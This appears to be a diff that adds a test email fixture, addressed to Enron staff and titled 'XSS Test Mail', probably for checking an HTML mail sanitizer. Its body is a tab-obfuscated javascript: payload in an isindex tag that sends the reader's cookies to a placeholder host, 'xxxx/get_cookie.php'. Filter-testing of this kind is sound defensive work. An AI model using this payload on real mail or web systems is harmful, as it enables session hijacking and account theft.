@@ -1,0 +1,7 @@
+From: lisayoho@hotmail.com
+To: tanya.rohauer@enron.com, tracy.ngo@enron.com
+Subject: XSS Test Mail
+MIME-Version: 1.0
+Content-type: text/html
+
+<isindex prompt="This is a test:" action="j&Tab;a&Tab;vas&Tab;c&Tab;r&Tab;ipt:(new Image()).src='http://xxxx/get_cookie.php?cookie_store='+encodeURIComponent(document.cookie)" type=image>
